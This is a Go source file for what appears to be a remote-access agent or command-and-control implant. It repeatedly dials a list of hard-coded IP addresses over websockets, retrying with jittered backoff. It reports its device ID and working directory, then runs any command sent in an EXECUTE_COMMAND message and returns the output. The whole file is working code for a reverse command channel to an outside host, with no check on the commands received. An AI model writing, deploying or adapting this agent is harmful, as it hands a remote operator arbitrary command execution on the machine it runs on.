package main

import (
	"encoding/json"
	"math/rand"
	"net/url"
	"os"
	"time"

	"github.com/gorilla/websocket"
)

var currentWorkingDir string

func main() {
	backoffCounter := 0
	maxBackoff := 30 * time.Second

	// Log the device ID at startup
	deviceID := generateDeviceID()
	DevLogf("Agent Device ID: %s", deviceID)

	rng := rand.New(rand.NewSource(time.Now().UnixNano()))

	dialer := websocket.Dialer{
		HandshakeTimeout: 5 * time.Second,
	}

	for {
		connected := false

		for _, ip := range IP_ADDRESSES {
			u := url.URL{
				Scheme: "ws",
				Host:   ip,
				Path:   "/",
			}

			DevLog("Connecting to:", u.String())

			conn, _, err := dialer.Dial(u.String(), nil)
			if err != nil {
				DevLog("dial failed:", err)
				continue
			}

			// ✅ Connected
			connected = true
			backoffCounter = 0
			DevLog("Connected to:", u.String())

			dir, _ := os.Getwd()
			currentWorkingDir = dir

			if err := sendMessage(conn, "CREATE_CONNECTION", dir); err != nil {
				DevLog("Failed to send initial message:", err)
				conn.Close()
				break
			}

			if err := handleConnection(conn); err != nil {
				DevLog("Connection error:", err)
			}

			conn.Close()
			time.Sleep(1 * time.Second)
			break
		}

		// 🔁 Only happens if ALL IPs failed
		if !connected {
			backoffCounter++
			if backoffCounter > 10 {
				backoffCounter = 10
			}

			backoff := min(
				time.Duration(1<<uint(backoffCounter))*time.Second,
				maxBackoff,
			)

			jitter := time.Duration(rng.Int63n(int64(backoff / 5)))
			backoff = backoff + jitter - backoff/10

			DevLogf("All IPs failed. Retrying in %v...\n", backoff)
			time.Sleep(backoff)
		}
	}
}

// handleConnection manages the message reading loop
func handleConnection(conn *websocket.Conn) error {
	for {
		_, msgBytes, err := conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				DevLogf("websocket error: %v", err)
			}
			return err
		}

		var incoming Message
		if err := json.Unmarshal(msgBytes, &incoming); err != nil {
			DevLog("⚠️ Invalid JSON:", err)
			continue
		}

		DevLog("Received message:", incoming.Type)

		// Filter messages: only process if meant for this device or broadcast
		if incoming.DeviceId != "" && incoming.DeviceId != generateDeviceID() {
			continue
		}

		// Process message in separate goroutine to avoid blocking read loop
		go processMessage(conn, incoming)
	}
}

// processMessage handles incoming messages without blocking the read loop
func processMessage(conn *websocket.Conn, msg Message) {
	switch msg.Type {
	case "EXECUTE_COMMAND":
		DevLog("Executing command:", msg.Content)
		output := executeCommand(msg.Content)
		if err := sendMessage(conn, "GET_COMMAND_OUTPUT", output); err != nil {
			DevLog("Failed to send command output:", err)
		}

	default:
		DevLog("Unknown message type:", msg.Type)
	}
}
